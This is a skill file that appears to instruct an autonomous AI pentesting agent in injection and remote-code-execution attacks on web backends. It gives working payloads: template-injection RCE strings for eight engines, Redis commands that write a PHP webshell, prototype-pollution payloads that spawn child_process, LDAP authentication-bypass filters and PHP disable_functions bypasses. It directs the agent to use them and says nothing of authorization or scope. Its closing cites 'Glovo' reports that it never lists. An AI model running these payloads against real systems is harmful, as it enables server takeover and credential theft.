---
name: injection-and-rce
description: Full injection-class technique list (SQLi, command injection, LDAP/XPath/XSLT/EL, SSTI, CRLF, HPP, prototype pollution) and remote-code-execution technique list (deserialization, file-upload webshells, LFI/RFI, framework-specific RCE, dependency CVEs), plus concrete exploitation mechanics for SSTI-per-engine, unauthenticated Redis RCE, filename argument injection, and cloud-metadata-to-RCE chaining. Converted from master-pentest-prompt.md Phases 2/3. Use during scan-agent's injection-testing pass on any target with user-controlled input reaching a backend.
---

# Injection and RCE

## When to use

scan-agent's injection-testing pass on any parameter, header, or body
field that reaches a backend. RCE techniques are often the escalation
path once an injection point is confirmed -- test injection first, then
check whether it chains into RCE via this skill's second half.

## All injections (injection overload)

- **SQLi**: UNION / blind / time / error / second-order / NoSQLi / ORM
  (HQL, GraphQL) -- `sqlmap-mcp` covers the automatable cases; see
  `knowledge/payloads/sqli.txt` for curated payloads when it misses
  something.
  - **NoSQL/ORM-specific, since these bypass "we use an ORM so we're safe"
    assumptions**: Mongo `$where`/`$regex`/`$ne` operator injection through
    a raw-object body param (not just string concatenation); an ORM's own
    convenience methods forwarding attacker JSON into a raw operator
    (Mongoose `populate({match:{$where:...}})`, CVE-2024-53900); an ORM
    building an *unquoted column alias* from a user-controlled JSON-field
    key rather than a value (Django `QuerySet.values()`, CVE-2024-42005,
    CVSS 9.8); pre-auth NoSQL injection via a raw method-call selector
    (Rocket.Chat `getPasswordPolicy`, CVE-2021-22911, brute-forced a
    password-reset token character-by-character via a `$regex` timing/
    boolean side-channel). Second-order SQLi on an OIDC-proxy backend
    (Mozilla H1 #2209130) is a reminder to test the auth-adjacent proxy
    layer, not just the application's own DB queries.
- **Command injection**: blind, out-of-band (DNS/HTTP callback via
  `oob-mcp`).
- **OS command chaining**: `;`, `|`, `&&`, `$()`, newlines, encoded
  bypasses.
- **Shellshock vectors** in User-Agent, Referer, Cookie.
- **LDAP, XPath, XQuery, XSLT, EL** (SpEL/OGNL), **SSTI**
  (Jinja2/Twig/Freemarker) -- see `knowledge/payloads/ssti.txt`.
- **CRLF -> Header Injection -> Cache Poisoning -> Stored XSS** chain.
- **HTTP Parameter Pollution (HPP)**: `;` vs `&`, duplicate params, JSON
  vs form encoding.
- **Hidden parameter tampering** (Param Miner style): `debug`, `test`,
  `source`, `deprecated`.
- **Server-side prototype pollution -> RCE** -- see
  `knowledge/payloads/prototype-pollution.txt`.
- **Domain/polyglot payloads** (SSTImap, smapcap style).

## RCE & code execution -- don't skip any

- **Deserialization**: PHP POP chains, Java (ysoserial:
  CommonsCollections, Spring, JDK), .NET (ViewState, ysoserial.net),
  Python (pickle/PyYAML), Ruby Marshal, Node.js (`node-serialize`), .NET
  `BinaryFormatter`.
- **File upload -> webshell** (double extension, null byte, magic byte,
  polyglot, `.htaccess`, SVG/XML, image with embedded PHP) -- see the
  `file-upload-and-traversal` skill for the full upload-bypass matrix.
- **LFI/RFI** -> `/proc/self/environ`, `php://input`, log poisoning,
  `data://`, `expect://`, other wrappers.
- **SSRF -> RCE** via internal Redis/Memcached/Hadoop/Elasticsearch/Minio
  -- see the `ssrf` skill.
- **XXE** -> `expect://`, PHP wrappers, FTP OOB.
- **ImageMagick** (ImageTragick, CVE-2016-3714), **LaTeX injection**.
- **Zip Slip / Tar Slip / symlink traversal** -- RCE on unpack.
- **Framework-specific**: Struts2 (OGNL), Spring4Shell, Log4Shell, Shiro,
  Laravel `APP_KEY`, Django `SECRET_KEY`, Rails mass-assignment.
- **Dependency CVEs**: grep every lockfile against a CVE DB
  (writeup-mcp's `fetch_cves`).
- **`phpinfo()` disclosure chained into upload-vector RCE** -- an exposed
  `info.php`/`phpinfo.php` is only Medium info-disclosure on its own;
  confirm exec viability via `disable_functions` before investing in a
  webshell (see the triage table below).
- **gRPC/Thrift/RMI/Java RMI** attack surface.
- **Unsafe `eval()`/`Function()`/`exec()` reflection** in server-side
  JS/PHP.
- **Serverless function injection** (temp files, env vars).
- **Cron/queue/worker deserialization RCE**.
- **Prototype pollution -> SSRF -> RCE** chains.
- **Client-side**: DOM clobbering for client RCE, Electron
  `contextIsolation` bypass.
- **First-class escalation path**: desync/request smuggling (see the
  `request-smuggling` skill) chained into RCE.

## RCE exploitation mechanics (concrete, not just the class name)

A few of the classes above are worth spelling out in exploitation detail
rather than just naming, since knowing the technique exists isn't the
same as knowing how to actually trigger it:

- **SSTI -> RCE, per engine** (once reflection is confirmed with a canary
  like `{{7*7}}` -> `49`): Jinja2 walks the object graph via
  `{{ ''.__class__.__mro__[1].__subclasses__() }}` to find a subprocess-
  capable class, then calls it; Twig via
  `{{ ['id']|filter('system') }}` or `{{ _self.env.registerUndefinedFilterCallback('exec') }}`;
  Freemarker via
  `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`;
  Handlebars via the constructor-escape
  `{{#with "s" as |string|}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}`
  (the Handlebars payload is intentionally ugly -- that's the actual
  shape of the constructor-chain escape, not a simplification). The
  remaining engines each need their own idiom: ERB (Ruby/Rails `.erb`
  views) just runs plain Ruby inside the tags -- `<%= system('id') %>`
  or backticks `<%= \`id\` %>`; Velocity (Java) has no `Runtime`-shaped
  built-in, so it walks there through the `$class` introspection
  utility -- `#set($str=$class.inspect("java.lang.Runtime"))
  #set($rt=$str.getRuntime()) $rt.exec("id")`; Thymeleaf (Spring) uses
  its SpEL preprocessing syntax directly in whichever attribute context
  is injectable -- `${T(java.lang.Runtime).getRuntime().exec("id")}` or
  the inline-expression form `*{T(java.lang.Runtime).getRuntime().exec('id')}`;
  Smarty (PHP) has a literal escape-hatch tag for exactly this --
  `{php}echo shell_exec("id");{/php}` (only where the `{php}` tag hasn't
  been removed in a newer Smarty release) or the shorter
  `{system('id')}` where a `system` modifier is registered.
- **Seven-engine differential fingerprint table** -- before spending a
  payload budget on the wrong engine, run the polyglot
  `{{7*7}}${7*7}<%=7*7%>` and read which cell renders as `49` (blank
  cells render the probe back literally, unevaluated):

  | Probe | Jinja2 | Twig | Freemarker | Velocity | ERB | EJS | Pug |
  |---|---|---|---|---|---|---|---|
  | `{{7*7}}` | 49 | 49 | 49 | 49 | -- | 49 | -- |
  | `{{7*'7'}}` | `7777777` | 49 | -- | -- | -- | -- | -- |
  | `${7*7}` | literal | literal | 49 | 49 | -- | literal | -- |
  | `<%=7*7%>` | literal | -- | -- | -- | 49 | 49 | -- |

  `{{7*'7'}}` is the single most reliable Jinja2-vs-Twig discriminator,
  since both otherwise render `{{7*7}}` identically as `49` -- Python
  string repetition (`7777777`) vs PHP numeric coercion (`49`) is the
  tell. When the math probe itself gets filtered, fall back to an
  intentionally malformed expression (`{{bad` with no closing brace);
  the resulting stack trace/error string usually names the engine,
  framework version, and template path directly.
- **Unauthenticated Redis -> webshell RCE**: `CONFIG SET dir
  /var/www/html`, `CONFIG SET dbfilename shell.php`, `SET x
  "<?php system($_GET['c']); ?>"`, `SAVE` -- writes the in-memory value
  to disk as a web-accessible PHP file. Requires a guessable/known web
  root and write access to it, but needs zero authentication if Redis
  itself has none (its default configuration).
- **Argument injection via filename, into a shell-invoked utility**: any
  endpoint that passes a user-controlled filename to a command-line
  image/media tool (GraphicsMagick, ImageMagick, ffmpeg) without a `--`
  argument-terminator can have that filename itself parsed as a flag —
  a filename starting with `|` or `-` can inject an argument the
  developer never intended to expose, independent of the file's actual
  content (see HackerOne #212696 below for the real-world version of
  this exact mechanism).
- **Cloud metadata SSRF -> RCE chain**: an SSRF hitting
  `169.254.169.254` (see the `ssrf` skill) that returns IAM/instance-role
  credentials doesn't stop at information disclosure — those credentials
  routinely grant enough IAM permission (`ssm:SendCommand`, a Lambda
  update permission, an ECS task-definition update) to pivot straight
  into command execution on compute infrastructure the SSRF alone never
  touched directly.
- **Deserialization payload signature detection**, before spending
  effort on a gadget chain: confirm a sink actually deserializes
  attacker input by recognizing the format's magic bytes rather than
  guessing from context. Java's native serialization stream header is
  `AC ED 00 05` (hex), which always base64-encodes starting `rO0AB` --
  either form shows up raw in a cookie or POST body wherever a Java app
  trusts client-supplied state. Python `pickle` has no fixed magic bytes,
  but protocol 2+ opens with `\x80` followed by the protocol-version
  byte (`\x80\x02`, `\x80\x03`, `\x80\x04`), and disassembling a captured
  blob with `pickletools.dis()` surfaces opcode-level tells like `c`
  (GLOBAL, importing a module/callable) or `R` (REDUCE, calling it) --
  the actual `__reduce__` gadget trigger. Apache Shiro's `rememberMe`
  cookie is itself the signature: its mere presence means the app is
  AES-encrypting a Java-serialized principal before base64-encoding it,
  and an unpatched install using Shiro's well-known default key turns
  that cookie into a direct ysoserial delivery channel. ASP.NET
  ViewState is exploitable whenever `__VIEWSTATE` appears in a response's
  hidden field without an accompanying `__VIEWSTATEMAC` value (or with a
  forged MAC the server still accepts) -- confirm this before reaching
  for `ysoserial.net`, since a properly MAC-protected ViewState makes the
  whole class inert until the `machineKey` itself leaks separately.
- **LDAP filter-injection methodology**, and the AD-vs-generic
  distinction that changes what "success" even means: a login/search
  feature that string-concatenates user input into a filter like
  `(&(uid=<INPUT>)(userPassword=<INPUT>))` is injectable if unescaped
  `* ( ) \` characters change server behavior -- an unbalanced `)`
  throwing a filter-syntax error, `javax.naming.directory.InvalidSearchFilterException`,
  or `LDAP: error code 49` is the tell. Filters are prefix/Polish
  notation (`&`=AND, `|`=OR, `!`=NOT) and every clause must stay
  parenthesis-balanced or the whole query errors instead of executing --
  an auth-bypass payload has to close the current `uid` clause and
  append an always-true branch, e.g. `admin)(|(uid=*` or
  `admin)(!(userPassword=ZZZ))`, and the resulting session must actually
  authenticate (not just avoid an error) before it counts as a bypass.
  Blind attribute exfiltration should be built on a paired true/false
  oracle (a known-true and a known-false filter on a public attribute),
  not raw response-length diffing, since length-jitter from the injected
  character itself is the top false-positive source. **Active Directory
  and generic LDAP (OpenLDAP/389-DS) are not interchangeable targets
  here**: AD's password attribute, `unicodePwd`, is write-only and is
  never returned by any search, so blind LDAP injection against AD can
  enumerate (`sAMAccountName`, `memberOf`, and the `description`/`info`
  fields admins routinely misuse to stash plaintext passwords) but can
  never yield a crackable hash; only generic/OpenLDAP directories expose
  a readable `userPassword` attribute holding `{SSHA}`/`{CRYPT}`-prefixed
  hashes, and only there does blind char-by-char exfiltration recover
  crackable credential material. Reporting "extracted AD password hashes
  via LDAP injection" is a claim the protocol cannot support -- don't
  make it.
- **Prototype-pollution -> RCE gadget chains, per Node.js template
  engine**: polluting `Object.prototype` alone is not impact -- it needs
  a gadget that reads a polluted property into a dangerous sink. EJS
  reads its `outputFunctionName` option off the options object with no
  origin check, so polluting
  `{"__proto__":{"outputFunctionName":"_tmp;global.process.mainModule.require('child_process').execSync('id');"}}`
  gets attacker code emitted directly into the compiled template
  function body; Pug's compiler reads a polluted `block`
  (`{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require('child_process').execSync('id')"}}}`)
  into its AST and executes it as compiled JS; Handlebars'
  `compileFunction` and `precompileOptions.knownHelpersOnly`/`compat`
  options are similarly read unauthenticated off the prototype chain,
  letting a polluted `compileFunction` string get evaluated as the
  compiled template. All three require the polluted property to survive
  until the *next* render call in the same process -- confirm the sink
  actually fires (`id`/`whoami` echoed back, or an OOB callback) before
  calling it more than a Medium finding. Separately, a filter that
  string-matches and strips literal `__proto__`/`constructor`/
  `prototype` before the merge can often still be bypassed with a
  Unicode homoglyph or combining-diacritic variant of the blocked string
  that the literal-string filter doesn't recognize but that a downstream
  `.normalize('NFKC')` call (the app's own sanitizer, or Node's
  Unicode-aware string handling) collapses back to the real property
  name before the merge consumes it -- always retest a blocked pollution
  payload through each of the app's own normalization/encoding layers
  before ruling the class out.
- **`phpinfo()` disclosure -> RCE viability triage**, before chaining
  into a file-upload webshell: an exposed `info.php`/`phpinfo.php` only
  proves information disclosure until the PHP config is confirmed to
  actually permit code execution --

  | `phpinfo()` directive | Confirms RCE viable | Blocks it |
  |---|---|---|
  | `disable_functions` | Only `pcntl_*` listed (or empty) -- `exec`/`system`/`passthru`/`shell_exec`/`popen`/`proc_open` all callable | Any of those six present |
  | `allow_url_include` | `On` | `Off` (RFI via a remote/`php://input` wrapper blocked) |
  | `allow_url_fopen` | `On` | `Off` (remote-URL file functions blocked) |
  | `open_basedir` | Not set, or a wide path like `/var/www:/tmp` | A tight jail excluding the upload directory |
  | `putenv()` | Not in `disable_functions` | Disabled (closes the `LD_PRELOAD` bypass path) |
  | FFI extension | Loaded, `FFI::cdef`/`FFI::scan` not disabled | Not loaded or disabled (closes the PHP 7.4+ bypass path) |

  When `disable_functions` blocks the direct route, `putenv()` plus
  `LD_PRELOAD` (triggered via a follow-on request that spawns a process
  indirectly, e.g. `mail()`) and `FFI::cdef()` are the two bypasses worth
  checking before giving up on the config entirely. Only once exec
  viability is confirmed is it worth pivoting to an actual upload vector
  (WordPress XMLRPC `wp.uploadFile` with open registration, a
  contact-form file field, a plugin upload endpoint) to land the
  webshell -- see the `file-upload-and-traversal` skill for the
  upload-bypass matrix itself.

## Real disclosed reports (precedent, not just theory)

These confirm the technique classes above paid out on real programs, not
just in theory:

- **SQLi**: HackerOne #2599826 (U.S. DoD, blind boolean-based SQLi via
  the `User-Agent` header -- a header-based injection point, not just a
  query param), #1069561 (Automattic, SQLi in intensedebate.com),
  #962889 (Acronis, SQLi in `agent-manager`).
- **RCE via deserialization**: HackerOne #1174185 (U.S. DoD, RCE via
  insecure deserialization in Telerik UI, CVE-2019-18935), #274990
  (RubyGems, RCE via deserialization on rubygems.org itself -- a
  reminder that package-registry infrastructure is as much a target as
  the applications built on it), #1248052 (U.S. DoD, pre-auth RCE in
  ForgeRock OpenAM via unsafe Java deserialization in its Jato
  framework, CVE-2021-35464).
- **RCE via SSTI**: HackerOne #164224 (Unikrn, SSTI via a Smarty
  template -- payload entered through firstname/lastname/nickname
  fields, a reminder that profile/settings forms are template-injection
  surface, not just search boxes), #423541 (Shopify, RCE via Handlebars
  template injection using the `{{this.constructor.constructor}}`
  constructor-escape -- exactly the mechanism spelled out above).
- **RCE via argument/command injection**: HackerOne #212696 (Imgur, RCE
  via command-line argument injection into GraphicsMagick through the
  `y` parameter of `/edit/process` -- filenames starting with `|` were
  parsed as shell arguments), #294462 (Ruby's `NET::FTP` stdlib,
  CVE-2017-17405, command injection via a crafted local/remote filename
  argument -- confirms this class isn't limited to web-app code, it hits
  standard-library FTP clients too).

Two patterns stand out across these: the DoD reports disclose at high
volume and tend toward exactly the boring, systematic classes in this
skill (header-based SQLi, known-CVE deserialization in a bundled
third-party component) rather than exotic chains -- thorough coverage of
the basics here is higher-yield than hunting for novelty. And the SSTI
reports (Unikrn, Glovo) both landed via ordinary profile fields
(firstname/lastname/nickname), not a search box or obviously
"templated" endpoint -- test every free-text field that might get
interpolated server-side, not just the ones that look template-shaped.
